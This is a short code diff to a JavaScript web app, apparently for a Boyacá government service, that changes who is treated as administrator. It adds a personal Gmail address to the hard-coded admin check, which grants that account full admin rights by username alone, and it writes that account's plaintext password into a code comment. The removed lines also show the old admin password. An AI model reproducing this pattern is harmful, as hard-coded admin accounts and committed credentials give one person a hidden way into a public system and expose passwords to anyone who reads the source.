@@ -1675,7 +1675,7 @@ const App = (() => {
     isAdminUnlocking = true;
 
     const user = (typeof Auth !== 'undefined' && Auth.getUser) ? Auth.getUser() : {};
-    const adminEmail = user.username || 'admin@boyaca.gov.co';
+    const adminEmail = user.username || 'alejoleo2022@gmail.com';
 
     const overlay = document.createElement('div');
     overlay.id = 'admin-unlock-dialog-overlay';
@@ -2201,7 +2201,7 @@ const App = (() => {
     const role = (user.role || '').toLowerCase();
     const uname = (user.username || '').toLowerCase();
     const mods = Array.isArray(user.modules) ? user.modules : ((typeof Auth !== 'undefined' && Auth.getUserModules) ? Auth.getUserModules(user) : []);
-    return role === 'administrador' || role === 'admin' || uname === 'admin' || uname === 'admin@boyaca.gov.co' || mods.includes('*') || mods.includes('all');
+    return role === 'administrador' || role === 'admin' || uname === 'admin' || uname === 'admin@boyaca.gov.co' || uname === 'alejoleo2022@gmail.com' || mods.includes('*') || mods.includes('all');
   }
 
   function applyNavigationPermissions(user = {}) {
@@ -2229,7 +2229,7 @@ const App = (() => {
     }
 
     if (isAdmin) {
-      // Para el Administrador técnico (admin@boyaca.gov.co / @dmin123):
+      // Para el Administrador técnico (alejoleo2022@gmail.com / @Alejo123):
       setVisibility('li-admin-errors', true);
       setVisibility('li-admin-backups', true);
       setVisibility('li-admin-modules-unlock', true);
